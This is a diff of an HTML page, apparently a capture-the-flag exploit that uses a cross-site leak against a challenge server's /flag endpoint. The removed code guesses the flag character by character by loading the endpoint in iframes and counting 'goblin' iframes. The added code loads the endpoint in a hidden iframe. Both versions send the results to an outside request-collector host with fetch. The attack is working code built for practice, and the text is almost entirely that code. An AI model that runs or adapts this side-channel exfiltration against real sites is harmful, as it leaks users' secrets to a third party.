@@ -3,43 +3,34 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Flag Finder</title>
+    <title>Goblin Iframe Counter</title>
 </head>
 <body>
-    <h1>Flag Finderx</h1>
+    <h1>Goblin Iframe Counter</h1>
     <script>
-        let server_flag = ''; // 전역 변수
+        const requestUrl = 'http://war.sschall.xyz:60001/flag';
 
-        const checkFlag = async () => {
-            for (let i = 32; i <= 127; i++) {
-                const flag = server_flag + String.fromCharCode(i); // 현재 FLAG에 추가
-                const requestUrl = `http://war.sschall.xyz:60001/flag?flag=${encodeURIComponent(flag)}`;
+        const checkGoblinIframes = () => {
+            // iframe 생성
+            const iframe = document.createElement('iframe');
+            iframe.src = requestUrl;
+            iframe.style.display = 'none'; // iframe을 화면에 보이지 않게 설정
+            document.body.appendChild(iframe);
 
-                // 현재 goblin iframe 개수 저장
-                const initialGoblinCount = document.querySelectorAll('iframe[id="goblin"]').length;
+            // iframe이 로드된 후 goblin iframe 개수를 체크
+            iframe.onload = () => {
+                const goblinIframes = document.querySelectorAll('iframe[id="goblin"]');
+                const goblinCount = goblinIframes.length;
 
-                // iframe 생성
-                const iframe = document.createElement('iframe');
-                iframe.src = requestUrl;
-                document.body.appendChild(iframe);
-
-                // 일정 시간 후 iframe 개수 확인
-                setTimeout(() => {
-                    const currentGoblinCount = document.querySelectorAll('iframe[id="goblin"]').length;
-
-                    // goblin iframe이 증가하지 않은 경우
-                    if (currentGoblinCount === initialGoblinCount) {
-                        console.log(`No new goblin for: ${flag}`);
-                        
-                        // 최종 요청 보내기
-                        const finalRequestUrl = `https://pkwfpij.request.dreamhack.games?flag=${encodeURIComponent(flag)}`;
-                        fetch(finalRequestUrl); // 응답 기다리지 않음
-                    }
-                }, 500); // 500ms 후 확인
-            }
+                // 최종 요청 보내기
+                const finalRequestUrl = `https://hxfqwbg.request.dreamhack.games?count=${goblinCount}`;
+                fetch(finalRequestUrl).then(() => {
+                    console.log(`Final request sent with goblin count: ${goblinCount}`);
+                });
+            };
         };
 
-        checkFlag();
+        checkGoblinIframes();
     </script>
 </body>
 </html>
